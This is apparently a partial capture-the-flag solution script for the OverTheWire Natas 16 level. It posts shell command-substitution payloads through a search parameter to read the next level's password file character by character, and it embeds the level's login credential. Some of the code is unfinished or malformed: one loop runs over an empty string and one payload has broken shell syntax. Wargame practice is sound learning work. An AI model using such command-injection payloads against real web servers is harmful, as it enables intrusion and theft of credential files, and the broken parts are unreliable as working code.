import requests
from requests.auth import HTTPBasicAuth
import re
import urllib.parse

dir = "/var/www/natas/natas16"
#chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
chars = ""
filtered = ""
password = ""

for char in chars:
    r = requests.post(f"http://natas16.natas.labs.overthewire.org/index.php?needle=^$(if [$(expr substr $(grep -o {char} /etc/natas_webpass/natas17) 1 1))", auth=HTTPBasicAuth("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"))

    text = re.findall(r"<pre>\n(.*)\n", r.text) 
    print(text)



cmd = "'"

for i in range(0, 60):
    needle = f"^$(expr substr $({cmd}) {i} 1)"
    needleParsed = urllib.parse.quote_plus(needle)

    r = requests.post(f"http://natas16.natas.labs.overthewire.org/index.php?needle={needleParsed}", auth=HTTPBasicAuth("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"))

    text = re.findall(r"<pre>\n(.*)\n", r.text) 
    
    if len(text) > 0 and len(text[0]) > 0 and text[0][0] != "<":
        password += text[0][0]
        print(password)

